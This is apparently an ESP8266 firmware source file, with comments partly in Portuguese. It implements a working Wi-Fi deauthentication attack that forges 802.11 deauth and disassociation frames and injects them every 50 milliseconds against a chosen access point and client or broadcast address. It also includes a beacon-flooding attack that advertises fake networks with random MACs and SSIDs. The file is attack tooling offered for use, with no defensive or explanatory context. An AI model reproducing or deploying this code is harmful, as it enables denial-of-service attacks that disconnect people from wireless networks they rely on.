#include "deauther.h"

#include <ESP8266WiFi.h>
#include "app_state.h"

extern "C"
{
#include "user_interface.h"
}

bool deautherRunning = false;
unsigned long deautherPacketsSent = 0;
bool beaconActive = false;
unsigned long beaconPacketsSent = 0;

// Variáveis de controle do ataque
static bool attackActive = false;
static uint8_t targetApMac[6];
static uint8_t targetClientMac[6];
static uint8_t targetChannel = 1;
static uint8_t attackReason = 7;
static unsigned long lastAttackPacketAt = 0;

// Pacote melhorado (mais compatível)
static uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

static uint8_t beaconPacket[128] = {
    /*  0 - 1  */ 0x80, 0x00,                                                                                                             // Type: Beacon
    /*  2 - 3  */ 0x00, 0x00,                                                                                                             // Duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                                                                                     // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // Source: Random
    /* 16 - 21 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // BSSID: Random
    /* 22 - 23 */ 0x00, 0x00,                                                                                                             // Sequence
    /* 24 - 31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                                                                         // Timestamp
    /* 32 - 33 */ 0x64, 0x00,                                                                                                             // Beacon interval: 100ms
    /* 34 - 35 */ 0x01, 0x04,                                                                                                             // Capability info
    /* 36 - 37 */ 0x00, 0x06,                                                                                                             // SSID tag
    /* 38 - 43 */ 'F', 'A', 'K', 'E', 'A', 'P',                                                                                           // SSID
    /* 44 - 45 */ 0x01, 0x08,                                                                                                             // Supported rates tag
    /* 46 - 53 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,                                                                         // Rates
    /* 54 - 55 */ 0x03, 0x01,                                                                                                             // DS parameter set
    /* 56      */ 0x01,                                                                                                                   // Channel
    /* 57 - 58 */ 0x05, 0x04,                                                                                                             // TIM tag
    /* 59 - 62 */ 0x00, 0x01, 0x00, 0x00,                                                                                                 // TIM
    /* 63 - 64 */ 0x2a, 0x01,                                                                                                             // ERP tag
    /* 65      */ 0x00,                                                                                                                   // ERP
    /* 66 - 67 */ 0x2f, 0x01,                                                                                                             // HT capabilities tag
    /* 68 - 83 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // HT
    /* 84 - 85 */ 0x3d, 0x01,                                                                                                             // HT information tag
    /* 86 - 87 */ 0x00, 0x00,                                                                                                             // HT info
    /* 88 - 89 */ 0x4a, 0x0e,                                                                                                             // RSN tag
    /* 90 - 108 */ 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 // RSN
};

void initDeauther()
{
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  Serial.println("Deauther initialized with STATION_MODE and promiscuous mode");
}

uint8_t *parseMac(String macStr)
{
  static uint8_t mac[6];
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  return mac;
}

void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
{
  // MUITO IMPORTANTE: Mudar para o canal do alvo
  wifi_set_channel(channel);
  delay(10); // Pequeno delay para estabilizar
  Serial.print("Changed to channel ");
  Serial.println(channel);

  Serial.println("Sending deauth packets");

  // Deauth from AP to client
  deauthPacket[0] = 0xC0;
  memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
  memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
  memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
  deauthPacket[24] = reason;

  // Deauth from AP to client - 5 times
  deauthPacket[0] = 0xC0;
  for (int i = 0; i < 5; i++)
  {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
  }

  // Disassociation from AP to client - 5 times
  deauthPacket[0] = 0xA0;
  for (int i = 0; i < 5; i++)
  {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
  }

  // If not broadcast, send from client to AP
  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
  {
    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Client
    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP

    deauthPacket[0] = 0xC0;
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
    }

    deauthPacket[0] = 0xA0;
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
    }
  }
  else
  {
    // For broadcast, also send from broadcast to AP
    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Broadcast
    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP

    deauthPacket[0] = 0xC0;
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
    }

    deauthPacket[0] = 0xA0;
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
    }
  }

  deautherPacketsSent += 20;
}

void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
{
  // Disconnect from STA to allow proper injection
  WiFi.disconnect(true);
  delay(100);

  memcpy(targetApMac, apMac, 6);
  memcpy(targetClientMac, clientMac, 6);
  targetChannel = channel;
  attackReason = reason;
  attackActive = true;
  deautherRunning = true;
  lastAttackPacketAt = millis();

  // Envia o primeiro imediatamente
  sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
}

void stopDeauthAttack()
{
  attackActive = false;
  deautherRunning = false;

  // Reconnect STA if configured
  if (wifiSsid.length() > 0)
  {
    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
  }
}

void startBeaconAttack()
{
  // Disconnect from STA to allow proper injection
  WiFi.disconnect(true);
  delay(100);

  beaconActive = true;
}

void stopBeaconAttack()
{
  beaconActive = false;

  // Reconnect STA if configured
  if (wifiSsid.length() > 0)
  {
    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
  }
}

void updateBeacon()
{
  if (beaconActive && (millis() - lastAttackPacketAt > 100))
  { // Envia a cada 100ms
    // Generate random MAC
    uint8_t mac[6];
    for (int i = 0; i < 6; i++)
      mac[i] = random(256);

    // Set MAC in packet
    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);

    // Set channel
    beaconPacket[56] = deautherChannel;

    // Generate random SSID
    String ssid = "FAKE" + String(random(1000));
    int len = ssid.length();
    beaconPacket[37] = len;
    for (int i = 0; i < len; i++)
    {
      beaconPacket[38 + i] = ssid[i];
    }

    wifi_set_channel(deautherChannel);
    delay(10);

    wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
    beaconPacketsSent++;
    lastAttackPacketAt = millis();
  }
}

bool isDeauthActive()
{
  return attackActive;
}

void updateDeauth()
{
  if (attackActive && (millis() - lastAttackPacketAt > 50))
  { // Envia a cada 50ms
    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
    lastAttackPacketAt = millis();
  }
}

void toggleDeauther()
{
  if (attackActive)
  {
    stopDeauthAttack();
    Serial.println("Deauther stopped");
  }
  else
  {
    uint8_t *apMac = parseMac(deautherApMac);
    uint8_t *clientMac = parseMac(deautherClientMac);
    Serial.print("Starting deauther with AP MAC: ");
    Serial.print(deautherApMac);
    Serial.print(", Client MAC: ");
    Serial.print(deautherClientMac);
    Serial.print(", Channel: ");
    Serial.println(deautherChannel);
    startDeauthAttack(apMac, clientMac, deautherChannel, 1);
    Serial.println("Deauther started");
  }
}
